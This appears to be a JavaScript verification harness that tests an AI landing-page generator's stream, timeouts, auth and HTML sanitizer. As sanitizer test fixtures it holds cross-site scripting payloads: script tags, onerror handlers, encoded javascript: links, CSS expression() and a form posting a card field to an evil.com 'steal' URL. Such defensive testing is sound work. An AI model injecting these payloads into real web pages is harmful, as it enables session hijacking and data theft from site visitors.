// Verification harness for GENERATE-WITH-AI (routes/aiPageGenerate.js).
//
// Boots a MOCK Anthropic endpoint (the SDK honours ANTHROPIC_BASE_URL — set
// BEFORE the route is imported), mounts the exported handler behind a STUB
// req.user (the real router keeps authenticate + requirePermission — nothing
// here weakens it), and drives the NDJSON stream end to end. Also mounts the
// REAL router to prove unauth → 401, and counts funnel_pages rows around a
// full run to prove the route never writes pages. Embedded PG at
// 127.0.0.1:5433 (same as the clone-page harness).
//
// Run:  node server/tests/ai-generate/route-stream.mjs
import http from 'node:http';

process.env.DATABASE_URL = 'postgres://puure@127.0.0.1:5433/puure_shoporder';
process.env.NODE_ENV = 'development';
process.env.MONEY_SWEEP_DISABLED = '1';
process.env.ANTHROPIC_API_KEY = 'test-key-not-real';
process.env.AI_GENERATE_CALL_TIMEOUT_MS = '1500'; // exercise the timeout path fast
process.env.JWT_SECRET = process.env.JWT_SECRET || 'test-secret';
process.env.JWT_REFRESH_SECRET = process.env.JWT_REFRESH_SECRET || 'test-secret-2';

const NM = '/Users/ludo/Mineblock-LLC/node_modules';
const express = (await import(`${NM}/express/index.js`)).default;
const postgres = (await import(`${NM}/postgres/src/index.js`)).default;

let pass = 0;
let fail = 0;
const check = (name, ok, extra = '') => {
  if (ok) { pass += 1; console.log(`PASS  ${name}`); }
  else { fail += 1; console.log(`FAIL  ${name}  ${extra}`); }
};

// ---------------------------------------------------------------------------
// Mock Anthropic endpoint
// ---------------------------------------------------------------------------
const ARCH = {
  page_title: 'SleepReset Landing',
  sections: [
    { name: 'Masthead + Kicker', purpose: 'Hook tired moms', wants_image: true, aspect: '4:5' },
    { name: 'Hero Figure', purpose: 'Show the product', wants_image: false },
    { name: 'FAQ', purpose: 'Answer objections', wants_image: false },
  ],
};

const SECTION_HTML = [
  // fenced on purpose — exercises the unfence path; carries the image contract
  '```html\n<section style="padding:40px"><h1>SleepReset</h1><div class="lb-ai-image" data-ai-image-prompt="A tired mom holding a warm cup, soft morning light, photorealistic" data-aspect="4:5" style="background:#f1f5f9;border:1px dashed #cbd5e1">Click to generate image</div></section>\n```',
  // hostile on purpose — script + onerror + javascript: must all be neutralized
  '<section><h2>Why melatonin fails</h2><script>alert("evil")</script><p>Reason one</p><img src=x onerror=alert(1)><a href="javascript:alert(1)">Buy now</a><script src="https://evil.example/x.js"></script></section>',
  // benign kitchen sink — must come through visually intact (no over-stripping)
  '<section style="padding:2rem;background:#fff"><h3>FAQ</h3><p>60-day guarantee.</p><a href="https://trypuure.co/buy" target="_blank" rel="noopener">Shop</a><img src="https://cdn.example.com/x.jpg" srcset="https://cdn.example.com/x.jpg 1x, https://cdn.example.com/y.jpg 2x" alt="product"><img src="data:image/png;base64,iVBORw0KGgo=" alt="inline"><style>.faq{color:#333;background:url(https://cdn.example.com/bg.png)}</style></section>',
];

const mockCalls = { arch: 0, sections: 0, aborts: 0 };
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
// SLOW_SECTIONS briefs delay each section 600ms (abort test); HANG_SECTION
// briefs delay 5s — past the 1.5s harness timeout (timeout test).
const delayFor = (txt) => (/HANG_SECTION/.test(txt) ? 5000 : /SLOW_SECTIONS/.test(txt) ? 600 : 0);

const mockServer = http.createServer((req, res) => {
  let raw = '';
  req.on('data', (c) => { raw += c; });
  req.on('end', () => {
    let body = {};
    try { body = JSON.parse(raw); } catch { /* leave empty */ }
    const respond = (code, obj) => {
      res.writeHead(code, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(obj));
    };
    if (!/\/v1\/messages$/.test(req.url)) return respond(404, { error: 'not found' });

    const userText = body.messages?.[0]?.content || '';

    if (body.tool_choice?.type === 'tool') {
      mockCalls.arch += 1;
      return respond(200, {
        id: 'msg_arch', type: 'message', role: 'assistant', model: body.model,
        content: [{ type: 'tool_use', id: 'toolu_1', name: 'emit_page_architecture', input: ARCH }],
        stop_reason: 'tool_use', stop_sequence: null,
        usage: { input_tokens: 100, output_tokens: 60 },
      });
    }

    const m = String(userText).match(/Write section (\d+):/);
    const idx = m ? Number(m[1]) - 1 : 0;
    mockCalls.sections += 1;
    if (/FAIL_SECTION_2/.test(String(userText)) && idx === 1) {
      // 400 is not retried by the SDK — the route must emit an error event.
      return respond(400, {
        type: 'error',
        error: { type: 'invalid_request_error', message: 'mock section failure' },
      });
    }
    // Count upstream aborts: the SDK tearing the socket down (client-close
    // propagation or its own timeout) closes the request before we respond.
    let tornDown = false;
    res.on('close', () => {
      if (!res.writableEnded) { tornDown = true; mockCalls.aborts += 1; }
    });
    return setTimeout(() => {
      if (tornDown) return;
      respond(200, {
        id: `msg_s${idx}`, type: 'message', role: 'assistant', model: body.model,
        content: [{ type: 'text', text: SECTION_HTML[idx] ?? '<section>fallback</section>' }],
        stop_reason: 'end_turn', stop_sequence: null,
        usage: { input_tokens: 200, output_tokens: 300 },
      });
    }, delayFor(String(userText)));
  });
});
await new Promise((r) => mockServer.listen(0, '127.0.0.1', r));
process.env.ANTHROPIC_BASE_URL = `http://127.0.0.1:${mockServer.address().port}`;

// ---------------------------------------------------------------------------
// Import the route AFTER the env is staged
// ---------------------------------------------------------------------------
const routeModule = await import('../../src/routes/aiPageGenerate.js');
const {
  generateHandler, sanitizeGeneratedHtml, sanitizeCss, extractImageSlots, MODEL_ALLOWLIST,
} = routeModule;
const realRouter = routeModule.default;

// Harness app: stub auth + exported handler (real router keeps authenticate).
const app = express();
app.use(express.json({ limit: '5mb' }));
app.use((req, _res, next) => { req.user = { id: 'u_test', role: 'admin' }; next(); });
app.post('/page', generateHandler);
// Real router (authenticate first) for the unauth probe.
app.use('/api/v1/ai-generate', realRouter);
const server = app.listen(0, '127.0.0.1');
await new Promise((r) => server.once('listening', r));
const BASE = `http://127.0.0.1:${server.address().port}`;

const postPage = (body, path = '/page', headers = {}) =>
  fetch(`${BASE}${path}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', ...headers },
    body: JSON.stringify(body),
  });

const readNdjson = async (res) => {
  const events = [];
  const reader = res.body.getReader();
  const decoder = new TextDecoder();
  let buf = '';
  for (;;) {
    const { done, value } = await reader.read();
    if (done) break;
    buf += decoder.decode(value, { stream: true });
    let nl;
    while ((nl = buf.indexOf('\n')) !== -1) {
      const line = buf.slice(0, nl).trim();
      buf = buf.slice(nl + 1);
      if (line) events.push(JSON.parse(line));
    }
  }
  return events;
};

// ---------------------------------------------------------------------------
// Unit: sanitizeGeneratedHtml — one assertion per reviewed injection vector
// ---------------------------------------------------------------------------
const san = (s) => sanitizeGeneratedHtml(s).html;
{
  // <script> family (kept from v1)
  const scripts = san('<div><script>1</script><script src="x"/><script >tail</div>');
  check('vector: <script> closed/self-closed/unclosed all removed', !/<script/i.test(scripts) && scripts.includes('<div>'));

  // on* handlers — every quoting style, incl. the whitespace trick
  const onerr = san('<img src=x onerror=alert(1)>');
  console.log(`  before: <img src=x onerror=alert(1)>\n  after:  ${onerr}`);
  check('vector: <img onerror> (unquoted) stripped, img + src kept',
    !/onerror/i.test(onerr) && /<img /.test(onerr) && /src="x"/.test(onerr), onerr);
  const onerrWs = san('<img src="x" onerror = "alert(1)" ONLOAD=\'x()\'>');
  check('vector: `onerror = ` whitespace trick + uppercase ONLOAD stripped',
    !/onerror|onload/i.test(onerrWs) && /src="x"/.test(onerrWs), onerrWs);
  const svg = san('<svg onload=alert(1)><circle cx="1"/></svg>');
  check('vector: <svg onload> stripped, svg kept', !/onload/i.test(svg) && /<svg>/.test(svg) && /circle/.test(svg), svg);

  // javascript: URLs — plain + entity-encoded + control chars
  const jsHref = san('<a href="javascript:alert(1)">x</a>');
  console.log(`  before: <a href="javascript:alert(1)">x</a>\n  after:  ${jsHref}`);
  check('vector: javascript: href dropped, <a> kept', !/javascript:/i.test(jsHref) && /<a>x<\/a>/.test(jsHref), jsHref);
  const jsEnt = san('<a href="jav&#x61;script:alert(1)">x</a>');
  check('vector: entity-encoded javascript: href dropped', !/href/i.test(jsEnt), jsEnt);
  const jsTab = san('<a href="java\tscript:alert(1)">x</a>');
  check('vector: control-char javascript: href dropped', !/href/i.test(jsTab), jsTab);

  // element removals
  check('vector: <iframe> removed with content', san('<p>a</p><iframe src="https://evil.com">fallback</iframe><p>b</p>') === '<p>a</p><p>b</p>');
  check('vector: <object>/<embed> removed', !/object|embed/i.test(san('<object data="x">o</object><embed src="x">')));
  check('vector: <base> removed', !/base/i.test(san('<base href="https://evil.com/">')));
  const form = san('<form action="https://evil.com/steal"><input name="cc"><button>Go</button></form>');
  check('vector: <form> unwrapped — action gone, children kept',
    !/<form|action=/i.test(form) && /<input name="cc">/.test(form) && /<button>Go<\/button>/.test(form), form);

  // CSS-side vectors
  const styleEl = san('<style>a{background:url(javascript:alert(1));width:expression(alert(1))}</style>');
  check('vector: <style> url(javascript:) + expression() neutralized',
    !/javascript:/i.test(styleEl) && !/expression\s*\(/i.test(styleEl) && /<style>/.test(styleEl), styleEl);
  const styleAttr = san('<div style="background:url( javascript:alert(1) );color:red">x</div>');
  check('vector: style="" url(javascript:) neutralized, benign CSS kept',
    !/javascript:/i.test(styleAttr) && /color:red/.test(styleAttr), styleAttr);

  // data: URLs — image-only, src-side only
  check('vector: data:text/html src dropped', !/src/i.test(san('<img src="data:text/html;base64,PHNjcmlwdD4=">')));
  check('benign: data:image src kept', /src="data:image\/png;base64,AAA"/.test(san('<img src="data:image/png;base64,AAA">')));
  check('vector: data:image in href still dropped (image-only is src-side)', !/href/i.test(san('<a href="data:image/png;base64,AAA">x</a>')));
  const srcset = san('<img srcset="javascript:alert(1) 1x, https://cdn.example.com/y.jpg 2x">');
  check('vector: srcset filtered per-entry', !/javascript:/i.test(srcset) && /https:\/\/cdn\.example\.com\/y\.jpg 2x/.test(srcset), srcset);

  // lb-ai-image contract survival
  const slot = '<div class="lb-ai-image" data-ai-image-prompt="A tired mom, soft light" data-aspect="4:5" style="background:#f1f5f9">Click to generate image</div>';
  check('lb-ai-image contract survives sanitization byte-preserved', san(slot) === slot, san(slot));

  // benign kitchen sink — nothing over-stripped
  const benign = SECTION_HTML[2];
  const kept = san(benign);
  check('benign kitchen sink: links/imgs/srcset/style block intact',
    /href="https:\/\/trypuure\.co\/buy"/.test(kept) && /target="_blank"/.test(kept)
    && /src="https:\/\/cdn\.example\.com\/x\.jpg"/.test(kept)
    && /srcset="https:\/\/cdn\.example\.com\/x\.jpg 1x, https:\/\/cdn\.example\.com\/y\.jpg 2x"/.test(kept)
    && /url\(https:\/\/cdn\.example\.com\/bg\.png\)/.test(kept)
    && /data:image\/png;base64,iVBORw0KGgo=/.test(kept)
    && /60-day guarantee/.test(kept),
    kept);

  check('sanitizeCss exported + standalone', sanitizeCss('a{width:expression(x)}') === 'a{width:blocked(x)}');

  const slots = extractImageSlots(
    '<div class="lb-ai-image" data-ai-image-prompt="a cat" data-aspect="1:1">x</div><div class="lb-ai-image" data-ai-image-prompt=\'a dog\'>y</div>'
  );
  check('extractImageSlots finds both slots with prompt + aspect default',
    slots.length === 2 && slots[0].prompt === 'a cat' && slots[0].aspect === '1:1' && slots[1].prompt === 'a dog' && slots[1].aspect === '16:9',
    JSON.stringify(slots));
  check('model allowlist is exactly the three shipped models',
    MODEL_ALLOWLIST.size === 3 && ['claude-sonnet-5', 'claude-fable-5', 'claude-opus-5'].every((m) => MODEL_ALLOWLIST.has(m)));
}

// ---------------------------------------------------------------------------
// funnel_pages count BEFORE the full run
// ---------------------------------------------------------------------------
const sql = postgres(process.env.DATABASE_URL, { onnotice: () => {} });
let pagesBefore = null;
try {
  pagesBefore = Number((await sql`SELECT COUNT(*)::int AS n FROM funnel_pages`)[0].n);
} catch (err) {
  console.log(`NOTE  funnel_pages count unavailable (${err.message}) — count check will be skipped`);
}

// ---------------------------------------------------------------------------
// 1. Full run: architecture + sections stream in order, correct shapes
// ---------------------------------------------------------------------------
{
  const res = await postPage({ brief: 'A listicle landing page for a sleep supplement.', brand: 'warm, cream + terracotta', model: 'claude-sonnet-5' });
  check('full run responds 200', res.status === 200, `got ${res.status}`);
  check('full run is NDJSON', /application\/x-ndjson/.test(res.headers.get('content-type') || ''), res.headers.get('content-type'));
  const events = await readNdjson(res);

  const archEv = events[0];
  check('first event is architecture', archEv?.type === 'architecture', JSON.stringify(archEv)?.slice(0, 120));
  check('architecture carries generated page title', archEv?.page_title === 'SleepReset Landing');
  check('architecture has 3 sections with names', archEv?.sections?.length === 3 && archEv.sections[0].name === 'Masthead + Kicker' && archEv.sections[1].name === 'Hero Figure');

  const sectionEvents = events.filter((e) => e.type === 'section');
  check('three section events streamed', sectionEvents.length === 3, `got ${sectionEvents.length}`);
  check('section events arrive in index order', sectionEvents.map((e) => e.index).join(',') === '0,1,2');
  check('section events carry names + html strings', sectionEvents.every((e) => typeof e.name === 'string' && typeof e.html === 'string' && e.html.length > 0));

  const s0 = sectionEvents[0];
  check('markdown fence is unwrapped', s0.html.startsWith('<section') && !s0.html.includes('```'));
  check('image slot extracted with prompt + aspect', s0.images?.length === 1 && /tired mom/.test(s0.images[0].prompt) && s0.images[0].aspect === '4:5', JSON.stringify(s0.images));
  check('placeholder markup (prompt in markup) survives', /data-ai-image-prompt="A tired mom/.test(s0.html) && /Click to generate image/.test(s0.html));

  const s1 = sectionEvents[1];
  check('mock section containing <script> arrives script-stripped', !/<script/i.test(s1.html), s1.html.slice(0, 200));
  check('streamed section arrives with onerror stripped', !/onerror/i.test(s1.html), s1.html.slice(0, 250));
  check('streamed section arrives with javascript: href dropped', !/javascript:/i.test(s1.html) && /<a>Buy now<\/a>/.test(s1.html), s1.html.slice(0, 250));
  check('sanitized section keeps its real content', /Reason one/.test(s1.html) && /Why melatonin fails/.test(s1.html));
  check('no images on imageless section', Array.isArray(s1.images) && s1.images.length === 0);

  const s2 = sectionEvents[2];
  check('streamed benign kitchen sink not over-stripped',
    /href="https:\/\/trypuure\.co\/buy"/.test(s2.html)
    && /srcset="https:\/\/cdn\.example\.com\/x\.jpg 1x, https:\/\/cdn\.example\.com\/y\.jpg 2x"/.test(s2.html)
    && /url\(https:\/\/cdn\.example\.com\/bg\.png\)/.test(s2.html),
    s2.html.slice(0, 300));

  const last = events[events.length - 1];
  check('stream ends with done event', last?.type === 'done' && last.total === 3, JSON.stringify(last));
  check('mock saw 1 architecture + 3 section calls', mockCalls.arch === 1 && mockCalls.sections === 3, JSON.stringify(mockCalls));
}

// ---------------------------------------------------------------------------
// 2. funnel_pages row count unchanged after the full run
// ---------------------------------------------------------------------------
if (pagesBefore != null) {
  const pagesAfter = Number((await sql`SELECT COUNT(*)::int AS n FROM funnel_pages`)[0].n);
  check('funnel_pages row count unchanged after a full run', pagesAfter === pagesBefore, `${pagesBefore} -> ${pagesAfter}`);
}

// ---------------------------------------------------------------------------
// 3. Mid-run model failure → error event, partial sections remain usable
// ---------------------------------------------------------------------------
{
  const res = await postPage({ brief: 'FAIL_SECTION_2 — a page whose second section dies.' });
  check('mid-run failure still responds 200 (stream already open)', res.status === 200);
  const events = await readNdjson(res);
  const sectionEvents = events.filter((e) => e.type === 'section');
  const errorEvents = events.filter((e) => e.type === 'error');
  check('one section landed before the failure', sectionEvents.length === 1 && sectionEvents[0].index === 0);
  check('failure emits an error event and ends the stream', errorEvents.length === 1 && events[events.length - 1].type === 'error', JSON.stringify(events.map((e) => e.type)));
  check('no done event after mid-run failure', !events.some((e) => e.type === 'done'));
  check('error names the failed section + usable partials', /Section 2/.test(errorEvents[0]?.error || '') && /1 finished section/.test(errorEvents[0]?.error || ''), errorEvents[0]?.error);
}

// ---------------------------------------------------------------------------
// 3b. Client disconnect aborts the in-flight Anthropic call
// ---------------------------------------------------------------------------
{
  const before = { sections: mockCalls.sections, aborts: mockCalls.aborts };
  const ctrl = new AbortController();
  const res = await fetch(`${BASE}/page`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ brief: 'SLOW_SECTIONS — a page whose sections dawdle.' }),
    signal: ctrl.signal,
  });
  // Read until the architecture lands (section 1 is now in flight), then hang up.
  const reader = res.body.getReader();
  const decoder = new TextDecoder();
  let buf = '';
  for (;;) {
    const { done, value } = await reader.read();
    if (done) break;
    buf += decoder.decode(value, { stream: true });
    if (buf.includes('"architecture"')) break;
  }
  ctrl.abort();
  await sleep(2000); // give the abort time to propagate + prove no more calls
  const sectionsMade = mockCalls.sections - before.sections;
  check('client abort tears down the in-flight upstream call', mockCalls.aborts > before.aborts, `aborts ${before.aborts} -> ${mockCalls.aborts}`);
  check('no further section calls after client abort', sectionsMade <= 2, `made ${sectionsMade}`);
}

// ---------------------------------------------------------------------------
// 3c. Hung upstream → per-call timeout → clean error event naming the phase
// ---------------------------------------------------------------------------
{
  const t0 = Date.now();
  const res = await postPage({ brief: 'HANG_SECTION — section one never answers.' });
  const events = await readNdjson(res);
  const err = events.find((e) => e.type === 'error');
  check('hung section → error event (not a hung stream)', Boolean(err), JSON.stringify(events.map((e) => e.type)));
  check('timeout error names the phase + window', /Section 1 .* timed out after 2s/.test(err?.error || ''), err?.error);
  check('timeout fired in bounded time (2 attempts of 1.5s + backoff)', Date.now() - t0 < 15_000, `${Date.now() - t0}ms`);
  check('no done event after timeout', !events.some((e) => e.type === 'done'));
}

// ---------------------------------------------------------------------------
// 4. Oversized brief → 413 (before any stream)
// ---------------------------------------------------------------------------
{
  const res = await postPage({ brief: 'x'.repeat(20 * 1024 + 1) });
  const j = await res.json();
  check('oversized brief → 413', res.status === 413 && /20KB/.test(j.error || ''), `got ${res.status} ${JSON.stringify(j)}`);
  const res2 = await postPage({ brief: 'ok', brand: 'y'.repeat(2 * 1024 + 1) });
  check('oversized brand → 413', res2.status === 413);
}

// ---------------------------------------------------------------------------
// 5. Disallowed model → 400; missing brief → 400
// ---------------------------------------------------------------------------
{
  const res = await postPage({ brief: 'ok', model: 'claude-haiku-4-5' });
  const j = await res.json();
  check('disallowed model → 400', res.status === 400 && /model must be one of/.test(j.error || ''), `got ${res.status}`);
  const res2 = await postPage({ model: 'claude-sonnet-5' });
  check('missing brief → 400', res2.status === 400);
}

// ---------------------------------------------------------------------------
// 6. Unauth → 401 through the REAL router (authenticate intact)
// ---------------------------------------------------------------------------
{
  // NOTE: the stub-user middleware above also runs for this path, but the
  // real router's own authenticate rejects on the missing token FIRST.
  const res = await postPage({ brief: 'ok' }, '/api/v1/ai-generate/page');
  const j = await res.json().catch(() => ({}));
  check('unauth via real router → 401', res.status === 401, `got ${res.status} ${JSON.stringify(j)}`);
}

// ---------------------------------------------------------------------------
console.log(`\n${pass} passed, ${fail} failed`);
await sql.end({ timeout: 2 }).catch(() => {});
server.close();
mockServer.close();
process.exit(fail ? 1 : 0);
